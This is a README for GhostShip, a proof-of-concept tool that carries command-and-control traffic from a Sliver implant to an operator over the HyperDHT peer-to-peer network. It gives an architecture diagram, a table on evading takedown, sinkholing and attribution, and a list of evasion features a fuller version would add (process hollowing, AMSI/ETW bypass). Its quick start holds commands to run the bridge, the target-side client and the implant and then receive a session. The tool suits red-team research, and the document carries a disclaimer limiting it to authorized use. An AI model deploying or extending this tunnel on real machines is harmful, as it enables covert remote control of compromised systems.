# GhostShip 👻🚢

## P2P Tunnel for C2 Traffic

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Proof of Concept](https://img.shields.io/badge/Status-PoC-orange.svg)](#)

---

> **⚠️ This is a Proof of Concept** — validates P2P transport only. Not stealthy, easily detected by EDR/XDR.

---

## Overview

**GhostShip** is a PoC peer-to-peer tunnel that transports C2 traffic through [HyperDHT](https://github.com/holepunchto/hyperdht).

Using HyperDHT from the [Pear](https://pears.com/) / [Holepunch](https://holepunch.to/) ecosystem, C2 traffic traverses a decentralized DHT—no public IPs, domains, or VPS needed.

---

## How It Works

```
[Target Machine]                              [Operator Machine]

  C2 Implant                                    C2 Server
  (e.g., Sliver)                               (e.g., Sliver)
       |                                            |
       v                                            v
  127.0.0.1:8888                              127.0.0.1:8888
       |                                            |
       v                                            v
  GhostShip Client  <------P2P/DHT------>  GhostShip Bridge
```

1. Operator starts C2 server (e.g., Sliver mTLS on port 8888)
2. **Bridge** connects to local C2 and exposes it via HyperDHT, generating a key (`hs://...`)
3. **Client** on target connects to DHT using the key, opens local port for implant
4. Implant connects to `127.0.0.1:8888`, traffic flows through P2P tunnel

---

## Traditional C2 vs Native P2P C2

The table below compares **traditional centralized C2** with a **hypothetical native P2P C2** (not this PoC).

| Aspect | Traditional C2 | Native P2P C2 |
|--------|---------------|---------------|
| **Topology** | Star (clients → central server) | Mesh (peer-to-peer via DHT) |
| **Infrastructure** | VPS, domains, static IPs | Zero—DHT is public |
| **Single Point of Failure** | Server takedown = total loss | No central server to seize |
| **Attribution** | WHOIS, IP registration, hosting logs | DHT anonymity layer |
| **Cost** | $10-100+/month | Free |
| **Setup Time** | Hours/days | Seconds |
| **Domain Fronting** | Often required | Not needed—no domains |
| **IP Rotation** | Manual or infra-dependent | Automatic via DHT |
| **Sinkholing** | Domains can be seized | No DNS = nothing to sinkhole |
| **Traffic Blending** | Patterns to known IPs | Blends with Pear/Keet traffic |
| **Takedown** | Single target | No central point |
| **NAT Traversal** | Port forwarding/redirectors | Built-in hole-punching |
| **Encryption** | Implementation-dependent | E2E by default (Noise) |
| **Certificates** | Required for HTTPS/mTLS | Key-based identity |
| **Redundancy** | Multiple servers needed | Inherent in DHT mesh |
| **Offline Queuing** | Server stores commands | Both peers must be online |
| **Latency** | Low (direct) | Higher (DHT routing) |
| **Network IOCs** | Known IPs, domains | DHT bootstrap nodes only |
| **DNS Queries** | C2 domain lookups | None |
| **JA3/JA3S** | Fingerprintable TLS | Noise protocol signature |

---

## About This PoC

GhostShip is a **proof of concept** that validates P2P transport feasibility using HyperDHT. It wraps existing C2 traffic through a Node.js tunnel—useful for research and experimentation, but not operationally viable.

A true native P2P C2 would be purpose-built from scratch: small native binary, process injection/hollowing, in-memory IPC instead of local ports, and proper evasion techniques (AMSI/ETW bypass, anti-forensics). This PoC has none of that—it runs visible Node.js processes, opens detectable TCP ports, and will be flagged by any competent EDR/XDR.

---

## Quick Start

### Operator Side

```bash
# Start Sliver
sliver-server
sliver > mtls --lport 8888

# Start Bridge
cd bridge/nodejs && npm install
node bridge.js --port 8888
# Note the key: hs://abc123...
```

### Target Side

```bash
# Start Client
cd client && npm install
node client.js --connect "hs://abc123..." --port 8888

# Run implant configured for 127.0.0.1:8888
./implant
```

### Receive Session

```
sliver > sessions
```

---

## Disclaimer

**Authorized security research and educational purposes only.**

Unauthorized access to computer systems is illegal. Always obtain proper authorization.

---

## License

MIT License - See [LICENSE](LICENSE) for details.
